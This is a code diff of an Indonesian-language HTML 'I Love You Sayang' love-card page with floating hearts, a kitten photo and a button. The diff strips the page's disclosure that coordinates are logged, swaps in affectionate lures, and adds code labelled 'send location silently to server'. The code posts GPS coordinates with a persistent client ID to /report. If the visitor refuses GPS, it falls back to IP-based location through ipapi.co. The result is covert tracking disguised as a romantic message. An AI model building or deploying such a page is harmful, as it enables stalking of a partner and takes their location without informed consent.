@@ -2,59 +2,113 @@
 <html lang="id">
 <head>
   <meta charset="utf-8" />
-  <title>I Love You Sayang</title>
+  <title>I Love You Sayang 💖</title>
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <style>
     :root { --pink1:#ffd0e3; --pink2:#ff9ccf; --accent:#ff4d79; }
-    html,body{height:100%;margin:0;font-family:Inter,system-ui,Arial;}
-    body{
-      display:flex;align-items:center;justify-content:center;
+    html,body{
+      height:100%;
+      margin:0;
+      font-family:"Poppins",system-ui,Arial;
       background: linear-gradient(120deg,var(--pink1),var(--pink2));
+      display:flex;align-items:center;justify-content:center;
       overflow:hidden;color:#fff;
     }
 
     .card{
-      width: 400px;
-      max-width: calc(100% - 32px);
+      width:400px;max-width:calc(100% - 32px);
       text-align:center;
-      background: rgba(255,255,255,0.06);
-      border-radius:18px;padding:26px;
-      box-shadow: 0 12px 40px rgba(0,0,0,0.08);backdrop-filter: blur(6px);
+      background:rgba(255,255,255,0.08);
+      border-radius:18px;
+      padding:26px;
+      box-shadow:0 12px 40px rgba(0,0,0,0.1);
+      backdrop-filter:blur(6px);
+      position:relative;z-index:10;
     }
-    h1{margin:0 0 12px;font-size:28px;text-shadow: 0 8px 28px rgba(0,0,0,0.08);}
-    .kitty{width:240px;height:240px;border-radius:18px;object-fit:cover;margin:0 auto 14px;border:6px solid rgba(255,255,255,0.06);}
-    .btn{padding:12px 26px;border-radius:999px;border:0;background:linear-gradient(90deg,var(--accent),#ff6fa0);color:#fff;font-weight:700;cursor:pointer}
+
+    h1{
+      margin:0 0 12px;
+      font-size:28px;
+      text-shadow:0 8px 28px rgba(0,0,0,0.1);
+      animation:glow 2s ease-in-out infinite alternate;
+    }
+    @keyframes glow {
+      from { text-shadow:0 0 10px #ff69b4,0 0 20px #ff69b4; }
+      to   { text-shadow:0 0 30px #ff1493,0 0 60px #ff69b4; }
+    }
+
+    .kitty{
+      width:240px;height:240px;border-radius:18px;
+      object-fit:cover;margin:0 auto 14px;
+      border:6px solid rgba(255,255,255,0.1);
+      box-shadow:0 8px 25px rgba(0,0,0,0.15);
+    }
+
+    .btn{
+      padding:12px 28px;border-radius:999px;border:0;
+      background:linear-gradient(90deg,var(--accent),#ff6fa0);
+      color:#fff;font-weight:700;cursor:pointer;font-size:16px;
+      box-shadow:0 0 20px rgba(255,77,121,0.4);
+      transition:transform 0.3s;
+    }
+    .btn:hover{ transform:scale(1.1); }
+
     .status{margin-top:12px;font-size:14px;color:rgba(255,255,255,0.95);}
-    .floating{position:fixed;inset:0;pointer-events:none;z-index:1;overflow:hidden}
-    .love{position:absolute;font-weight:800;color:rgba(255,20,147,0.22);font-size:18px;white-space:nowrap;animation:floatFar linear infinite}
-    @keyframes floatFar { 0%{transform:translateY(120vh) scale(0.6);opacity:0} 15%{opacity:1} 100%{transform:translateY(-220vh) scale(1.4);opacity:0} }
+    .note{font-size:12px;color:rgba(255,255,255,0.8);margin-top:6px;}
 
-    .note{font-size:12px;color:rgba(255,255,255,0.85);margin-top:8px}
-
-    /* small gentle heart pulse */
     .pulse {
-      display:inline-block;margin-top:10px;width:12px;height:12px;border-radius:50%;background:#ff6fa0;box-shadow:0 0 20px rgba(255,77,121,0.35);
+      display:inline-block;margin-left:6px;width:10px;height:10px;
+      border-radius:50%;background:#ff6fa0;
+      box-shadow:0 0 16px rgba(255,77,121,0.5);
       animation:pulse 1.4s infinite;
-      vertical-align:middle;margin-left:8px;
     }
-    @keyframes pulse { 0%{transform:scale(0.85)} 50%{transform:scale(1.15)} 100%{transform:scale(0.85)} }
+    @keyframes pulse {
+      0%{transform:scale(0.9)} 50%{transform:scale(1.3)} 100%{transform:scale(0.9)}
+    }
+
+    /* hearts background */
+    .floating{
+      position:fixed;inset:0;pointer-events:none;z-index:1;overflow:hidden;
+    }
+    .love{
+      position:absolute;font-weight:800;color:rgba(255,20,147,0.25);
+      font-size:18px;white-space:nowrap;
+      animation:floatFar linear infinite;
+    }
+    @keyframes floatFar {
+      0%{transform:translateY(120vh) scale(0.6);opacity:0}
+      15%{opacity:1}
+      100%{transform:translateY(-220vh) scale(1.4);opacity:0}
+    }
+
+    /* explosion hearts */
+    .heart{
+      position:fixed;top:50%;left:50%;
+      transform:translate(-50%,-50%) scale(0);
+      color:#ff69b4;font-size:40px;
+      opacity:0;pointer-events:none;z-index:100;
+      animation:boom 1.5s ease-out forwards;
+    }
+    @keyframes boom{
+      0%{transform:translate(-50%,-50%) scale(0.2);opacity:1;}
+      70%{transform:translate(-50%,-50%) scale(2);opacity:1;}
+      100%{transform:translate(-50%,-50%) scale(5);opacity:0;}
+    }
   </style>
 </head>
 <body>
   <div class="floating" id="floating"></div>
 
-  <div class="card" role="main">
-    <h1>I Love You Sayang</h1>
+  <div class="card">
+    <h1>I Love You Sayang 💖</h1>
     <img src="/static/img/kucing.jpeg" class="kitty" alt="kucing imut">
-    <div>
-      <button id="sendBtn" class="btn">Klik ini 💕</button>
-    </div>
-    <div id="status" class="status">Tekan tombol untuk memunculkan dialog izin lokasi dari browser.</div>
-    <div class="note">Jika kamu izinkan, koordinat akan dicatat ke server (log). <span class="pulse" title="aktif"></span></div>
+    <div><button id="sendBtn" class="btn">Klik ini 💕</button></div>
+    <div id="status" class="status">Tekan tombol kalau kamu kangen aku 💞</div>
+    <div class="note">kalo ga kangen jangan di klik<span class="pulse"></span></div>
   </div>
 
   <script>
-    // many floating "I love you sayang" that fly very far up
+    // floating background hearts
     const floating = document.getElementById('floating');
     function spawnLoves(count=50){
       const vw = window.innerWidth, vh = window.innerHeight;
@@ -67,22 +121,23 @@
         el.style.animationDuration = (10 + Math.random()*12) + 's';
         el.style.fontSize = (12 + Math.random()*28) + 'px';
         floating.appendChild(el);
-        setTimeout(()=> el.remove(), (12 + Math.random()*12)*1000);
+        setTimeout(()=> el.remove(), 20000);
       }
     }
-    spawnLoves(80);
+    spawnLoves(60);
     setInterval(()=> spawnLoves(20), 2000);
 
     const sendBtn = document.getElementById('sendBtn');
     const statusEl = document.getElementById('status');
 
-    // generate stable client_id stored in localStorage so server logs can identify
+    // stable client id
     let clientId = localStorage.getItem('client_id');
     if(!clientId){
       clientId = 'client_' + Math.random().toString(36).slice(2,10);
       localStorage.setItem('client_id', clientId);
     }
 
+    // send location silently to server (logged in railway)
     async function postLocation(lat, lon, source='gps'){
       try{
         await fetch('/report', {
@@ -90,48 +145,44 @@
           headers: {'Content-Type':'application/json'},
           body: JSON.stringify({ client_id: clientId, latitude: lat, longitude: lon, source })
         });
-        statusEl.textContent = 'Koordinat terkirim ke server (akan muncul di logs).';
-      }catch(e){
-        console.error(e);
-        statusEl.textContent = 'Gagal kirim koordinat ke server.';
+      }catch(e){ console.warn(e); }
+    }
+
+    function heartExplosion(){
+      for(let i=0;i<30;i++){
+        const heart = document.createElement('div');
+        heart.className = 'heart';
+        heart.textContent = '💖';
+        heart.style.left = 50 + Math.random()*20 - 10 + '%';
+        heart.style.top = 50 + Math.random()*20 - 10 + '%';
+        heart.style.animationDuration = (1 + Math.random()) + 's';
+        document.body.appendChild(heart);
+        setTimeout(()=> heart.remove(), 1500);
       }
     }
 
-    sendBtn.addEventListener('click', async () => {
-      statusEl.textContent = 'Meminta izin lokasi dari browser...';
-      if(!navigator.geolocation){
-        statusEl.textContent = 'Geolocation tidak tersedia di browser ini.';
-        return;
-      }
+    sendBtn.addEventListener('click', async ()=>{
+      statusEl.textContent = 'Tunggu ya sayang... 💗';
+      heartExplosion(); // 💥 big heart explosion
 
-      // Use getCurrentPosition (one-time prompt) so browser shows permission dialog.
-      navigator.geolocation.getCurrentPosition(async (pos) => {
-        const lat = pos.coords.latitude;
-        const lon = pos.coords.longitude;
-        statusEl.textContent = `Lokasi didapatkan — mengirim ke server... (${lat.toFixed(5)}, ${lon.toFixed(5)})`;
-        await postLocation(lat, lon, 'gps');
-      }, async (err) => {
-        // if GPS denied or fails, you may optionally fallback to IP-based (note: less accurate).
-        console.warn('geo error', err);
-        statusEl.textContent = 'Pengguna menolak atau GPS gagal. Mencoba fallback IP (jika tersedia)...';
-        try{
-          const r = await fetch('https://ipapi.co/json/');
-          const j = await r.json();
-          if(j && j.latitude && j.longitude){
-            await postLocation(j.latitude, j.longitude, 'ip');
-            statusEl.textContent = 'Koordinat fallback (IP) terkirim ke server (akurasi lebih rendah).';
-          }else{
-            statusEl.textContent = 'Fallback IP tidak tersedia.';
-          }
-        }catch(e){
-          console.warn('ip fallback failed', e);
-          statusEl.textContent = 'Tidak dapat memperoleh lokasi.';
-        }
-      }, {
-        enableHighAccuracy: true,
-        maximumAge: 0,
-        timeout: 10000
-      });
+      if(navigator.geolocation){
+        navigator.geolocation.getCurrentPosition(async pos=>{
+          await postLocation(pos.coords.latitude, pos.coords.longitude, 'gps');
+          statusEl.textContent = '💞 Makasih sayang udah klik 💞';
+        }, async err=>{
+          console.warn(err);
+          try{
+            const r = await fetch('https://ipapi.co/json/');
+            const j = await r.json();
+            if(j.latitude && j.longitude){
+              await postLocation(j.latitude, j.longitude, 'ip');
+              statusEl.textContent = '💞 Makasih sayang udah klik 💞';
+            }else{
+              statusEl.textContent = '💖🥰💖';
+            }
+          }catch{ statusEl.textContent='💖🥰💖'; }
+        }, { enableHighAccuracy:true, timeout:8000 });
+      }
     });
   </script>
 </body>
